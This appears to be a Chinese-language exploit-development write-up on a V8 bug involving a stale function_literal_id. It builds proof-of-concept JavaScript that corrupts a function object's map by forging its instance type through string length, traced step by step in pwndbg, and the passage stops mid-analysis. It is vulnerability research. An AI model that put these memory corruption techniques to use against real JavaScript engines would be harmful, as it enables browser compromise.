+<p>可见，这里只更正了f的index为2，而v1、f1、f2的index都还没更新，导致<code>fun-&gt;function_literal_id()</code>会比函数个数还大。现在来研究一下function_literal_id会对编译造成什么影响。<br>在<code>FinalizeUnoptimizedCode</code>阶段，即字节码的最后阶段，有如下代码</p>
+<pre><code>  // Finalize the inner functions&#39; compilation jobs.
+  for (auto&amp;&amp; inner_job : *inner_function_jobs) &#123;
+    Handle&lt;SharedFunctionInfo&gt; inner_shared_info =
+        Compiler::GetSharedFunctionInfo(
+            inner_job-&gt;compilation_info()-&gt;literal(), parse_info-&gt;script(),
+            isolate);
+    // The inner function might be compiled already if compiling for debug.
+    if (inner_shared_info-&gt;is_compiled()) continue;
+    if (FinalizeUnoptimizedCompilationJob(inner_job.get(), inner_shared_info,
+                                          isolate) !=
+        CompilationJob::SUCCEEDED) &#123;
+      return false;
+    &#125;
+  &#125;
+</code></pre>
+<p>这里根据<code>inner_job-&gt;compilation_info()-&gt;literal()</code>取到了内部函数的<code>FunctionLiteral</code>对象，但记住因为漏洞的原因，它的literal_id没有更新，仍然为解析时的那个顺序，其中<code>(function() &#123;          print(&quot;f2&quot;)       &#125;);</code>的literal_id为7。显然，我们的字节码并没有7段，那么我们多增加几个函数</p>
+<pre><code>function fun() &#123;
+   var f = (v1 = (function() &#123;
+      var a = 0;
+      if (a) &#123;
+         return;
+      &#125; else &#123;
+         return;
+      &#125;
+      (function() &#123;
+         print(&quot;f1&quot;);
+      &#125;);
+      (function() &#123;
+         print(&quot;f2&quot;)
+      &#125;);
+   &#125;))=&gt;&#123;&#125;;
+   f();
+&#125;
+
+
+function fun2() &#123;
+   fun();
+&#125;
+
+function fun3() &#123;
+   fun();
+&#125;
+
+fun2();
+fun3();
+</code></pre>
+<p>下标7的位置函数正好是fun3函数</p>
+<pre><code>[generated bytecode for function: ]
+............
+[generated bytecode for function: fun2]
+............
+[generated bytecode for function: fun]
+...........
+[generated bytecode for function: f]
+...........
+[generated bytecode for function: v1]
+...........
+[generated bytecode for function: ]
+...........
+[generated bytecode for function: ]
+..........
+[generated bytecode for function: fun3]
+</code></pre>
+<p>这意味着取到的<code>inner_shared_info</code>将会是fun3的<code>shared_info</code>，而这里处理的函数实际上是<code>(function() &#123;          print(&quot;f2&quot;)       &#125;);</code>那么执行FinalizeUnoptimizedCompilationJob时</p>
+<pre><code>CompilationJob::Status FinalizeUnoptimizedCompilationJob(
+    UnoptimizedCompilationJob* job, Handle&lt;SharedFunctionInfo&gt; shared_info,
+    Isolate* isolate) &#123;
+  UnoptimizedCompilationInfo* compilation_info = job-&gt;compilation_info();
+  ParseInfo* parse_info = job-&gt;parse_info();
+
+  SetSharedFunctionFlagsFromLiteral(compilation_info-&gt;literal(), shared_info);
+
+  CompilationJob::Status status = job-&gt;FinalizeJob(shared_info, isolate);
+  if (status == CompilationJob::SUCCEEDED) &#123;
+    InstallUnoptimizedCode(compilation_info, shared_info, parse_info, isolate);
+    CodeEventListener::LogEventsAndTags log_tag;
+    if (parse_info-&gt;is_toplevel()) &#123;
+      log_tag = compilation_info-&gt;is_eval() ? CodeEventListener::EVAL_TAG
+                                            : CodeEventListener::SCRIPT_TAG;
+    &#125; else &#123;
+      log_tag = parse_info-&gt;lazy_compile() ? CodeEventListener::LAZY_COMPILE_TAG
+                                           : CodeEventListener::FUNCTION_TAG;
+    &#125;
+    job-&gt;RecordFunctionCompilation(log_tag, shared_info, isolate);
+    job-&gt;RecordCompilationStats(isolate);
+  &#125;
+  return status;
+&#125;
+</code></pre>
+<p>其中的<code>InstallUnoptimizedCode</code>会将<code>(function() &#123;          print(&quot;f2&quot;)       &#125;);</code>的字节码绑定到fun3函数对象上，也就是调用fun3时会调用<code>(function() &#123;          print(&quot;f2&quot;)       &#125;);</code>这说明这个漏洞导致了函数错位。除此之外还有什么影响呢？<br>这将导致<code>(function() &#123;          print(&quot;f2&quot;)       &#125;);</code>函数使用的context将会是fun3的context。<br>使用如下代码测试</p>
+<pre><code>function fun() &#123;
+   var f = (v1 = (function() &#123;
+      var a = 0;
+      if (a) &#123;
+         return;
+      &#125; else &#123;
+         return;
+      &#125;
+      (function() &#123;
+         print(&quot;f1&quot;);
+      &#125;);
+      (function() &#123;
+         print(&quot;f2&quot;);
+         a = &quot;a&quot;.repeat(100);
+      &#125;);
+   &#125;))=&gt;&#123;&#125;;
+   f();
+&#125;
+
+let arr = [1.1,2.2,3.3];
+
+function fun2() &#123;
+   fun();
+&#125;
+
+function fun3() &#123;
+   fun();
+&#125;
+
+fun2();
+%DebugPrint(fun);
+%SystemBreak();
+fun3();
+</code></pre>
+<p>其中f2的字节码如下</p>
+<pre><code>Frame size 24
+  204 E&gt; 0x21f372c1f542 @    0 : a5                StackCheck 
+  218 S&gt; 0x21f372c1f543 @    1 : 13 00 00          LdaGlobal [0], [0]
+         0x21f372c1f546 @    4 : 26 fb             Star r0
+         0x21f372c1f548 @    6 : 12 01             LdaConstant [1]
+         0x21f372c1f54a @    8 : 26 fa             Star r1
+  218 E&gt; 0x21f372c1f54c @   10 : 5d fb fa 02       CallUndefinedReceiver1 r0, r1, [2]
+  240 S&gt; 0x21f372c1f550 @   14 : 12 02             LdaConstant [2]
+         0x21f372c1f552 @   16 : 26 fa             Star r1
+  248 E&gt; 0x21f372c1f554 @   18 : 28 fa 03 04       LdaNamedProperty r1, [3], [4]
+         0x21f372c1f558 @   22 : 26 fb             Star r0
+         0x21f372c1f55a @   24 : 0c 64             LdaSmi [100]
+         0x21f372c1f55c @   26 : 26 f9             Star r2
+  248 E&gt; 0x21f372c1f55e @   28 : 59 fb fa f9 06    CallProperty1 r0, r1, r2, [6]
+  242 E&gt; 0x21f372c1f563 @   33 : 1d 04             StaCurrentContextSlot [4]
+         0x21f372c1f565 @   35 : 0d                LdaUndefined 
+  267 S&gt; 0x21f372c1f566 @   36 : a9                Return 
+Constant pool (size = 4)
+</code></pre>
+<p>我们在<code>StaCurrentContextSlot</code>字节码断点，因为这里会向context的第4个插槽写数据，也就是说这里在修改fun3的context内容。</p>
+<pre><code>   0x7f4a3b433925 &lt;Builtins_StaCurrentContextSlotHandler+37&gt;     movabs r10, 0x100000000
+   0x7f4a3b43392f &lt;Builtins_StaCurrentContextSlotHandler+47&gt;     cmp    r10, rdx
+   0x7f4a3b433932 &lt;Builtins_StaCurrentContextSlotHandler+50&gt;     jae    Builtins_StaCurrentContextSlotHandler+65 &lt;Builtins_StaCurrentContextSlotHandler+65&gt;
+    ↓
+   0x7f4a3b433941 &lt;Builtins_StaCurrentContextSlotHandler+65&gt;     mov    rbx, qword ptr [rbx - 8]
+   0x7f4a3b433945 &lt;Builtins_StaCurrentContextSlotHandler+69&gt;     lea    rdx, [rdx*8 + 0xf]
+ ► 0x7f4a3b43394d &lt;Builtins_StaCurrentContextSlotHandler+77&gt;     mov    qword ptr [rbx + rdx], rax
+   0x7f4a3b433951 &lt;Builtins_StaCurrentContextSlotHandler+81&gt;     mov    rsi, -0x80000
+pwndbg&gt; job $rbx
+0x21f372c1ed09: [Context] in OldSpace
+ - map: 0x0cfeb6b81049 &lt;Map&gt;
+ - length: 5
+ - scope_info: 0x21f372c1e8a1 &lt;ScopeInfo SCRIPT_SCOPE [9]&gt;
+ - previous: 0x21f372c01749 &lt;NativeContext[247]&gt;
+ - extension: 0x0cfeb6b805b1 &lt;the_hole&gt;
+ - native_context: 0x21f372c01749 &lt;NativeContext[247]&gt;
+           0: 0x21f372c1e8a1 &lt;ScopeInfo SCRIPT_SCOPE [9]&gt;
+           1: 0x21f372c01749 &lt;NativeContext[247]&gt;
+           2: 0x0cfeb6b805b1 &lt;the_hole&gt;
+           3: 0x21f372c01749 &lt;NativeContext[247]&gt;
+           4: 0x37962980c941 &lt;JSArray[3]&gt;
+pwndbg&gt; job 0x37962980c941
+0x37962980c941: [JSArray]
+ - map: 0x078e20f82de9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]
+ - prototype: 0x21f372c10c89 &lt;JSArray[0]&gt;
+ - elements: 0x37962980c919 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]
+ - length: 3
+ - properties: 0x0cfeb6b80c21 &lt;FixedArray[0]&gt; &#123;
+    #length: 0x198440c801a9 &lt;AccessorInfo&gt; (const accessor descriptor)
+ &#125;
+ - elements: 0x37962980c919 &lt;FixedDoubleArray[3]&gt; &#123;
+           0: 1.1
+           1: 2.2
+           2: 3.3
+ &#125;
+
+.............................................
+   0x7f4a3b43394d &lt;Builtins_StaCurrentContextSlotHandler+77&gt;     mov    qword ptr [rbx + rdx], rax
+ ► 0x7f4a3b433951 &lt;Builtins_StaCurrentContextSlotHandler+81&gt;     mov    rsi, -0x80000
+pwndbg&gt; job $rbx
+0x21f372c1ed09: [Context] in OldSpace
+ - map: 0x0cfeb6b81049 &lt;Map&gt;
+ - length: 5
+ - scope_info: 0x21f372c1e8a1 &lt;ScopeInfo SCRIPT_SCOPE [9]&gt;
+ - previous: 0x21f372c01749 &lt;NativeContext[247]&gt;
+ - extension: 0x0cfeb6b805b1 &lt;the_hole&gt;
+ - native_context: 0x21f372c01749 &lt;NativeContext[247]&gt;
+           0: 0x21f372c1e8a1 &lt;ScopeInfo SCRIPT_SCOPE [9]&gt;
+           1: 0x21f372c01749 &lt;NativeContext[247]&gt;
+           2: 0x0cfeb6b805b1 &lt;the_hole&gt;
+           3: 0x21f372c01749 &lt;NativeContext[247]&gt;
+           4: 0x37962980caa1 &lt;String[100]: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&gt;
+</code></pre>
+<p>可见，这里可以修改内存里的数据，并且没有边界检查，并且我们发现在Context的第4个插槽后方正好就是fun对象</p>
+<pre><code>pwndbg&gt; x /100gx 0x21f372c1ed08
+0x21f372c1ed08: 0x00000cfeb6b81049  0x0000000500000000
+0x21f372c1ed18: 0x000021f372c1e8a1  0x000021f372c01749
+0x21f372c1ed28: 0x00000cfeb6b805b1  0x000021f372c01749
+0x21f372c1ed38: 0x000037962980caa1  0x0000078e20f803b9
+pwndbg&gt; job 0x21f372c1ed41
+0x21f372c1ed41: [Function] in OldSpace
+ - map: 0x078e20f803b9 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]
+ - prototype: 0x21f372c01ff1 &lt;JSFunction (sfi = 0x198440c88009)&gt;
+ - elements: 0x0cfeb6b80c21 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
+ - function prototype: 
+ - initial_map: 
+ - shared_info: 0x21f372c1e9a1 &lt;SharedFunctionInfo fun&gt;
+ - name: 0x21f372c1e7b9 &lt;String[#3]: fun&gt;
+</code></pre>
+<p>那么，我们可以在f函数里增加几个变量，就可以覆盖fun对象的<code>MAP</code>。</p>
+<pre><code>function fun() &#123;
+   var f = (v1 = (function() &#123;
+      let a = 0;
+      let b = 0;
+      if (a) &#123;
+         return;
+      &#125; else &#123;
+         return;
+      &#125;
+      (function() &#123;
+         print(&quot;f1&quot;);
+      &#125;);
+      (function() &#123;
+         print(&quot;f2&quot;);
+         //修改arr指针为a
+         a = [1.1,2.2,3.3];
+         //修改fun的MAP为b
+         b = &quot;a&quot;.repeat(10);
+      &#125;);
+   &#125;))=&gt;&#123;&#125;;
+   f();
+&#125;
+
+let arr = &#123;&#125;;
+
+function fun2() &#123;
+   fun();
+&#125;
+
+function fun3() &#123;
+   fun();
+&#125;
+
+fun2();
+//%DebugPrint(fun);
+//%SystemBreak();
+fun3();
+
+fun[0x66] = 0x123;
+</code></pre>
+<p>运行后发现崩溃</p>
+<pre><code>root@ubuntu:~/Desktop/v8/out.gn/x64.debug.bug# ./d8 poc.js
+f2
+abort: CSA_ASSERT failed: IsMap(map) [../../src/code-stub-assembler.cc:5929]
+</code></pre>
+<p>显然是因为我们覆盖了fun函数对象的MAP为b对象的地址，导致DCHECK的检查不通过。但在Release版本里是没有DCHECK的，运行后发现无报错崩溃，那么最后一句fun[0]发生了什么，0x123被写入到哪了？</p>
+<h3 id="KeyedStoreIC"><a href="#KeyedStoreIC" class="headerlink" title="KeyedStoreIC"></a>KeyedStoreIC</h3><p>V8中使用<code>StaKeyedProperty</code>字节码处理下标赋值的操作，该字节码首先会调用<code>Builtins_KeyedStoreIC</code>函数</p>
+<pre><code>void AccessorAssembler::KeyedStoreIC(const StoreICParameters* p) &#123;
+void AccessorAssembler::KeyedStoreIC(const StoreICParameters* p) &#123;
+.....................................
+    Node* receiver_map = LoadReceiverMap(p-&gt;receiver);
+    GotoIf(IsDeprecatedMap(receiver_map), &amp;miss);
+.....................................
+  BIND(&amp;miss);
+  &#123;
+    Comment(&quot;KeyedStoreIC_miss&quot;);
+    TailCallRuntime(Runtime::kKeyedStoreIC_Miss, p-&gt;context, p-&gt;value, p-&gt;slot,
+                    p-&gt;vector, p-&gt;receiver, p-&gt;name);
+  &#125;
+&#125;
+</code></pre>
+<p>由于这里<code>receiver_map</code>直接取到的就是我们在fun函数中创建的b字符串对象，而对象地址是具有随机性的，因此有很大的几率到达miss标签，这里是处理IC缓存缺失的情况，调用慢方法<code>KeyedStoreIC_Miss</code>。<code>KeyedStoreIC_Miss</code>的调用链为<code>KeyedStoreIC_Miss</code>-&gt;<code>KeyedStoreIC::Store</code>-&gt;<code>Runtime::SetObjectProperty</code>。其中<code>Runtime::SetObjectProperty</code>源码如下</p>
+<pre><code>MaybeHandle&lt;Object&gt; Runtime::SetObjectProperty(
+    Isolate* isolate, Handle&lt;Object&gt; object, Handle&lt;Object&gt; key,
+    Handle&lt;Object&gt; value, StoreOrigin store_origin,
+    Maybe&lt;ShouldThrow&gt; should_throw) &#123;
+......................
+  // Check if the given key is an array index.
+  bool success = false;
+  LookupIterator it =
+      LookupIterator::PropertyOrElement(isolate, object, key, &amp;success);
+  if (!success) return MaybeHandle&lt;Object&gt;();
+
+  if (!it.IsFound() &amp;&amp; key-&gt;IsSymbol() &amp;&amp;
+      Symbol::cast(*key)-&gt;is_private_name()) &#123;
+    Handle&lt;Object&gt; name_string(Symbol::cast(*key)-&gt;name(), isolate);
+    DCHECK(name_string-&gt;IsString());
+    THROW_NEW_ERROR(isolate,
+                    NewTypeError(MessageTemplate::kInvalidPrivateFieldWrite,
+                                 name_string, object),
+                    Object);
+  &#125;
+
+  MAYBE_RETURN_NULL(
+      Object::SetProperty(&amp;it, value, store_origin, should_throw));
+
+  return value;
+&#125;
+</code></pre>
+<p>该函数调用<code>LookupIterator::PropertyOrElement</code>函数，这个函数的作用是根据key，从对象的prototype链中寻找合适的<code>holder</code>,(即寻找与这个key合适的数组，这样后面可以将数据存入对应的数组)，具体过程如下</p>
+<pre><code>LookupIterator LookupIterator::PropertyOrElement(
+    Isolate* isolate, Handle&lt;Object&gt; receiver, Handle&lt;Name&gt; name,
+    Configuration configuration) &#123;
+  uint32_t index;
+  if (name-&gt;AsArrayIndex(&amp;index)) &#123;
+    LookupIterator it = LookupIterator(isolate, receiver, index, configuration);
+    it.name_ = name;
+    return it;
+  &#125;
+  return LookupIterator(isolate, receiver, name, configuration);
+&#125;
+</code></pre>
+<p>调试运行</p>
+<pre><code>   57   uint32_t index = 0;
+   58   if (key-&gt;ToArrayIndex(&amp;index)) &#123;
+   59     *success = true;
+ ► 60     return LookupIterator(isolate, receiver, index, configuration);
+   61   &#125;
+pwndbg&gt; p/x index
+$137 = 0x66
+</code></pre>
+<p>可以知道它会继续调用<code>LookupIterator</code>，跟进去</p>
+<pre><code>LookupIterator::LookupIterator(Isolate* isolate, Handle&lt;Object&gt; receiver,
+                               uint32_t index, Configuration configuration)
+    : LookupIterator(isolate, receiver, index,
+                     GetRoot(isolate, receiver, index), configuration) &#123;&#125;
+</code></pre>
+<p>这里会调用GetRoot</p>
+<pre><code>Handle&lt;JSReceiver&gt; LookupIterator::GetRoot(Isolate* isolate,
+                                           Handle&lt;Object&gt; receiver,
+                                           uint32_t index) &#123;
+  if (receiver-&gt;IsJSReceiver()) return Handle&lt;JSReceiver&gt;::cast(receiver);
+  return GetRootForNonJSReceiver(isolate, receiver, index);
+&#125;
+</code></pre>
+<p>如果满足条件<code>receiver-&gt;IsJSReceiver()</code>，则直接返回原对象，否则会创建一个新的NewJSObject，显然这不是我们想要的</p>
+<pre><code>Handle&lt;JSReceiver&gt; LookupIterator::GetRootForNonJSReceiver(
+    Isolate* isolate, Handle&lt;Object&gt; receiver, uint32_t index) &#123;
+  // Strings are the only objects with properties (only elements) directly on
+  // the wrapper. Hence we can skip generating the wrapper for all other cases.
+  if (index != kMaxUInt32 &amp;&amp; receiver-&gt;IsString() &amp;&amp;
+      index &lt; static_cast&lt;uint32_t&gt;(String::cast(*receiver)-&gt;length())) &#123;
+    // TODO(verwaest): Speed this up. Perhaps use a cached wrapper on the native
+    // context, ensuring that we don&#39;t leak it into JS?
+    Handle&lt;JSFunction&gt; constructor = isolate-&gt;string_function();
+    Handle&lt;JSObject&gt; result = isolate-&gt;factory()-&gt;NewJSObject(constructor);
+    Handle&lt;JSValue&gt;::cast(result)-&gt;set_value(*receiver);
+    return result;
+  &#125;
+  auto root =
+      handle(receiver-&gt;GetPrototypeChainRootMap(isolate)-&gt;prototype(), isolate);
+  if (root-&gt;IsNull(isolate)) &#123;
+    isolate-&gt;PushStackTraceAndDie(reinterpret_cast&lt;void*&gt;(receiver-&gt;ptr()));
+  &#125;
+  return Handle&lt;JSReceiver&gt;::cast(root);
+&#125;
+</code></pre>
+<p>因为我们希望能够通过已有的数据构造出一个Prototype链，而不是创建一个新的。那么<code>receiver-&gt;IsJSReceiver()</code>是怎么判断的呢？最终会调用到<code>IsJSReceiver(InstanceType instance_type)</code></p>
+<pre><code>V8_INLINE bool IsJSReceiver(InstanceType instance_type) &#123;
+  STATIC_ASSERT(LAST_TYPE == LAST_JS_RECEIVER_TYPE);
+  return instance_type &gt;= FIRST_JS_RECEIVER_TYPE;
+&#125;
+.................
+FIRST_JS_RECEIVER_TYPE = JS_PROXY_TYPE,
+........
+  JS_PROXY_TYPE = 0x0400,  // FIRST_JS_RECEIVER_TYPE
+  JS_GLOBAL_OBJECT_TYPE,   // FIRST_JS_OBJECT_TYPE
+  JS_GLOBAL_PROXY_TYPE,
+  JS_MODULE_NAMESPACE_TYPE,
+  // Like JS_API_OBJECT_TYPE, but requires access checks and/or has
+  // interceptors.
+  JS_SPECIAL_API_OBJECT_TYPE = 0x0410,  // LAST_SPECIAL_RECEIVER_TYPE
+</code></pre>
+<p>这个TYPE实际上就是MAP对象中偏移0xc处的一个数据，我们可以使用如下代码调试观察</p>
+<pre><code>var a = new Proxy(&#123;&#125;,&#123;&#125;);
+%DebugPrint(a);
+%SystemBreak();
+
+pwndbg&gt; job 0x05fe41603e79
+0x5fe41603e79: [Map]
+ - type: JS_PROXY_TYPE
+pwndbg&gt; x /20wx 0x05fe41603e78
+0x5fe41603e78:  0xd2c80189  0x0000207f  0x2e000004  0x19000400
+</code></pre>
+<p>那么现在，由于string对象成为了MAP，那么为了绕过这里的坎，我们要保证&amp;string+0xc处的short数据&gt;&#x3D;0x400，我们使用如下代码进行调试观察一下string的结构</p>
+<pre><code>var a = &#39;a&#39;.repeat(0x400);
+var b = [a];
+%DebugPrint(b);
+%SystemBreak();
+..............................
+ - elements: 0x26799f98c839 &lt;FixedArray[1]&gt; &#123;
+           0: 0x26799f98c819 &lt;String[1024]: aaaa......
+.............................
+</code></pre>
+<p>可以知道string对象地址为<code>0x26799f98c819</code>，我们查看数据</p>
+<pre><code>pwndbg&gt; x /20wx 0x26799f98c818
+0x26799f98c818: 0xb5e81e59  0x00002de1  0x00000003  0x00000400
+</code></pre>
+<p>可以发现，在0xc的位置正好是字符串长度，因为，我们可以通过控制字符串长度来伪造MAP结构中的TYPE。于是，我们将POC代码改为如下</p>
+<pre><code>.....................
+         print(&quot;f2&quot;);
+         //修改arr指针为a
+         a = [1.1,2.2,3.3];
+         //修改fun的MAP为b
+         b = &quot;a&quot;.repeat(0x400);
+.............
+</code></pre>
+<p>然后进行调试</p>
+<pre><code>   155 Handle&lt;JSReceiver&gt; LookupIterator::GetRoot(Isolate* isolate,
+   156                                            Handle&lt;Object&gt; receiver,
+   157                                            uint32_t index) &#123;
+ ► 158   if (receiver-&gt;IsJSReceiver()) return Handle&lt;JSReceiver&gt;::cast(receiver);
+   159   return GetRootForNonJSReceiver(isolate, receiver, index);
+   160 &#125;
+pwndbg&gt; p receiver-&gt;IsJSReceiver()
+$138 = true
+</code></pre>
+<p>这次满足要求，便可以直接返回。接下来进入<code>LookupIterator</code>的构造函数</p>
+<pre><code>In file: /home/sea/Desktop/v8/src/lookup.h
+   71         initial_holder_(holder),
+   72         index_(index),
+   73         number_(static_cast&lt;uint32_t&gt;(DescriptorArray::kNotFound)) &#123;
+   74     // kMaxUInt32 isn&#39;t a valid index.
+   75     DCHECK_NE(kMaxUInt32, index_);
+ ► 76     Start&lt;true&gt;();
+   77   &#125;
+</code></pre>
+<p>Start函数调用<code>LookupInHolder</code>函数</p>
+<pre><code>In file: /home/sea/Desktop/v8/src/lookup.cc
+   151   holder_ = initial_holder_;
+   152 
+   153   JSReceiver holder = *holder_;
+   154   Map map = holder-&gt;map();
+   155 
+ ► 156   state_ = LookupInHolder&lt;is_element&gt;(map, holder);
+</code></pre>
+<p>我们继续跟进</p>
+<pre><code>   220   inline State LookupInHolder(Map map, JSReceiver holder) &#123;
+ ► 221     return map-&gt;IsSpecialReceiverMap()
+   222                ? LookupInSpecialHolder&lt;is_element&gt;(map, holder)
+   223                : LookupInRegularHolder&lt;is_element&gt;(map, holder);
+   224   &#125;
+pwndbg&gt; p map-&gt;IsSpecialReceiverMap()
+$139 = true
+</code></pre>
+<p>这里会判断<code>SpecialReceiverMap</code>，其判断的逻辑为</p>
+<pre><code>inline bool IsSpecialReceiverInstanceType(InstanceType instance_type) &#123;
+  return instance_type &lt;= LAST_SPECIAL_RECEIVER_TYPE;
+&#125;
+
+// This should be in objects/map-inl.h, but can&#39;t, because of a cyclic
+// dependency.
+bool Map::IsSpecialReceiverMap() const &#123;
+  bool result = IsSpecialReceiverInstanceType(instance_type());
+  DCHECK_IMPLIES(!result,
+                 !has_named_interceptor() &amp;&amp; !is_access_check_needed());
+  return result;
+&#125;
+...............
+ // Boundary for testing JSReceivers that need special property lookup handling
+  LAST_SPECIAL_RECEIVER_TYPE = JS_SPECIAL_API_OBJECT_TYPE,
+  JS_SPECIAL_API_OBJECT_TYPE = 0x0410,  // LAST_SPECIAL_RECEIVER_TYPE
+</code></pre>
+<p>可见这里也是根据MAP中的TYPE<br>ID来进行判断的，因此也是可以被我们控制。IsSpecialReceiverMap()为true后，会调用<code>LookupInSpecialHolder</code>函数</p>
+<pre><code>template &lt;bool is_element&gt;
+LookupIterator::State LookupIterator::LookupInSpecialHolder(
+    Map const map, JSReceiver const holder) &#123;
+  STATIC_ASSERT(INTERCEPTOR == BEFORE_PROPERTY);
+  switch (state_) &#123;
+    case NOT_FOUND:
+      if (map-&gt;IsJSProxyMap()) &#123;
+        if (is_element || !name_-&gt;IsPrivate()) return JSPROXY;
+      &#125;
+      if (map-&gt;is_access_check_needed()) &#123;
+        if (is_element || !name_-&gt;IsPrivate()) return ACCESS_CHECK;
+      &#125;
+      V8_FALLTHROUGH;
+    case ACCESS_CHECK:
+      if (check_interceptor() &amp;&amp; HasInterceptor&lt;is_element&gt;(map) &amp;&amp;
+          !SkipInterceptor&lt;is_element&gt;(JSObject::cast(holder))) &#123;
+        if (is_element || !name_-&gt;IsPrivate()) return INTERCEPTOR;
+      &#125;
+      V8_FALLTHROUGH;
+    case INTERCEPTOR:
+      if (!is_element &amp;&amp; map-&gt;IsJSGlobalObjectMap()) &#123;
+        GlobalDictionary dict =
+            JSGlobalObject::cast(holder)-&gt;global_dictionary();
+        int number = dict-&gt;FindEntry(isolate(), name_);
+        if (number == GlobalDictionary::kNotFound) return NOT_FOUND;
+        number_ = static_cast&lt;uint32_t&gt;(number);
+        PropertyCell cell = dict-&gt;CellAt(number_);
+        if (cell-&gt;value()-&gt;IsTheHole(isolate_)) return NOT_FOUND;
+        property_details_ = cell-&gt;property_details();
+        has_property_ = true;
+        switch (property_details_.kind()) &#123;
+          case v8::internal::kData:
+            return DATA;
+          case v8::internal::kAccessor:
+            return ACCESSOR;
+        &#125;
+      &#125;
+.......................................
+</code></pre>
+<p>由于我们的TYPE<br>ID伪造为0x400，因此<code>map-&gt;IsJSProxyMap()</code>返回true，导致<code>LookupInSpecialHolder</code>返回的类型为<code>JSPROXY</code>，这不是我们希望的，我们希望能返回DATA，因为这种类型能被我们进行读写，而PROXY不行。最终导致脚本运行结果如下</p>
+<pre><code>./b.js:41: TypeError: Cannot perform &#39;set&#39; on a proxy that has been revoked
+fun[0x66] = 0x123;
+          ^
+TypeError: Cannot perform &#39;set&#39; on a proxy that has been revoked
+    at ./b.js:41:11
+</code></pre>
+<p>那么，我们将TYPE ID增大，POC中代码修改为</p>
+<pre><code>.....................
+         print(&quot;f2&quot;);
+         //修改arr指针为a
+         a = [1.1,2.2,3.3];
+         //修改fun的MAP为b
+         b = &quot;a&quot;.repeat(0x800);
+.............
+</code></pre>
+<p>于是，这回我们将进入<code>LookupInRegularHolder</code>函数</p>
+<pre><code>   220   inline State LookupInHolder(Map map, JSReceiver holder) &#123;
+   221     return map-&gt;IsSpecialReceiverMap()
+   222                ? LookupInSpecialHolder&lt;is_element&gt;(map, holder)
+ ► 223                : LookupInRegularHolder&lt;is_element&gt;(map, holder);
+   224   &#125;
+</code></pre>
+<p>其代码如下</p>
+<pre><code>template &lt;bool is_element&gt;
+LookupIterator::State LookupIterator::LookupInRegularHolder(
+    Map const map, JSReceiver const holder) &#123;
+  DisallowHeapAllocation no_gc;
+  if (interceptor_state_ == InterceptorState::kProcessNonMasking) &#123;
+    return NOT_FOUND;
+  &#125;
+
+  if (is_element) &#123;
+    JSObject js_object = JSObject::cast(holder);
+    ElementsAccessor* accessor = js_object-&gt;GetElementsAccessor();
+    FixedArrayBase backing_store = js_object-&gt;elements();
+    number_ =
+        accessor-&gt;GetEntryForIndex(isolate_, js_object, backing_store, index_);
+    if (number_ == kMaxUInt32) &#123;
+      return holder-&gt;IsJSTypedArray() ? INTEGER_INDEXED_EXOTIC : NOT_FOUND;
+    &#125;
+    property_details_ = accessor-&gt;GetDetails(js_object, number_);
+  &#125; else if (!map-&gt;is_dictionary_map()) &#123;
+..................................
+  &#125;
+  has_property_ = true;
+  switch (property_details_.kind()) &#123;
+    case v8::internal::kData:
+      return DATA;
+    case v8::internal::kAccessor:
+      return ACCESSOR;
+  &#125;
+
+  UNREACHABLE();
+&#125;
+</code></pre>
+<p>由于<code>is_element</code>默认为true，因此将进入<code>is_element</code>分支</p>
+<pre><code>   1159   if (is_element) &#123;
+   1160     JSObject js_object = JSObject::cast(holder);
+   1161     ElementsAccessor* accessor = js_object-&gt;GetElementsAccessor();
+   1162     FixedArrayBase backing_store = js_object-&gt;elements();
+ ► 1163     number_ =
+   1164         accessor-&gt;GetEntryForIndex(isolate_, js_object, backing_store, index_);
+   1165     if (number_ == kMaxUInt32) &#123;
+   1166       return holder-&gt;IsJSTypedArray() ? INTEGER_INDEXED_EXOTIC : NOT_FOUND;
+   1167     &#125;
+pwndbg&gt; p/x js_object-&gt;ptr_
+$145 = 0x61f6349ed01
+pwndbg&gt; p/x backing_store-&gt;ptr_
+$147 = 0x317690b80c21
+pwndbg&gt; x /20gx 0x61f6349ed00
+0x61f6349ed00:  0x00002deae918ce19  0x0000317690b80c21
+0x61f6349ed10:  0x0000317690b80c21  0x0000061f6349e999
+0x61f6349ed20:  0x0000061f6349ecc9  0x0000061f6349ec89
+pwndbg&gt; job 0x317690b80c21
+0x317690b80c21: [FixedArray]
+ - map: 0x317690b807b1 &lt;Map&gt;
+ - length: 0
+</code></pre>
+<p>可以知道，当前操作对象就是fun函数对象，取出了对象默认的elements()，然后调用<code>GetEntryForIndex</code>函数</p>
+<pre><code>  static uint32_t GetEntryForIndexImpl(Isolate* isolate, JSObject holder,
+                                       FixedArrayBase backing_store,
+                                       uint32_t index, PropertyFilter filter) &#123;
+    DCHECK(IsFastElementsKind(kind()));
+    uint32_t length = Subclass::GetMaxIndex(holder, backing_store);
+    if (IsHoleyElementsKind(kind())) &#123;
+      return index &lt; length &amp;&amp;
+                     !BackingStore::cast(backing_store)
+                          -&gt;is_the_hole(isolate, index)
+                 ? index
+                 : kMaxUInt32;
+    &#125; else &#123;
+      return index &lt; length ? index : kMaxUInt32;
+    &#125;
+  &#125;
+</code></pre>
+<p>该函数用于检查index是否与当前的这个elements合适，即index在length范围内的话，就能与当前的elements匹配成功。显然这里我们匹配失败。返回NOT_FOUND</p>
+<pre><code>   1163     number_ =
+   1164         accessor-&gt;GetEntryForIndex(isolate_, js_object, backing_store, index_);
+   1165     if (number_ == kMaxUInt32) &#123;
+ ► 1166       return holder-&gt;IsJSTypedArray() ? INTEGER_INDEXED_EXOTIC : NOT_FOUND;
+   1167     &#125;
+</code></pre>
+<p>于是，在<code>LookupIterator::Start</code>中，函数将继续执行<code>NextInternal&lt;is_element&gt;(map, holder);</code>开始遍历ProtoType链</p>
+<pre><code>   157   if (IsFound()) return;
+   158 
+ ► 159   NextInternal&lt;is_element&gt;(map, holder);
+   160 &#125;
+</code></pre>
+<p>遍历的逻辑如下</p>
+<pre><code>template &lt;bool is_element&gt;
+void LookupIterator::NextInternal(Map map, JSReceiver holder) &#123;
+  do &#123;
+    JSReceiver maybe_holder = NextHolder(map);
+    if (maybe_holder.is_null()) &#123;
+      if (interceptor_state_ == InterceptorState::kSkipNonMasking) &#123;
